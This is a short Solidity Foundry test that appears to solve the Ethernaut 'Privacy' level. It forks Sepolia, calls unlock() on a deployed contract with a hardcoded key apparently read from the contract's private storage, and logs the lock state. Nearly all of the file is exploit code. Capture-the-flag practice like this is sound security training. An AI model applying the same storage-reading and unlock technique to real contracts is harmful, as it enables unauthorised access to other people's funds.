// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

import "../instance/Level12.sol";
import "forge-std/Test.sol";

contract ExploitLevel12 is Test {
    Privacy instance = Privacy(0x762db17A37E974b80ed9b5Ccc1c57c6Ca8eF3B40);
    bytes32 key = 0x3900545d5a77592d99883df92caa3493c302c6d64daedcc519dbfa128a7404cd;

    function setUp() external {
        vm.createSelectFork("sepolia");
    }

    function testExploit() external {
        vm.broadcast();
        instance.unlock(bytes16(key));
        console.log("Contract locked:", instance.locked());
    }
}
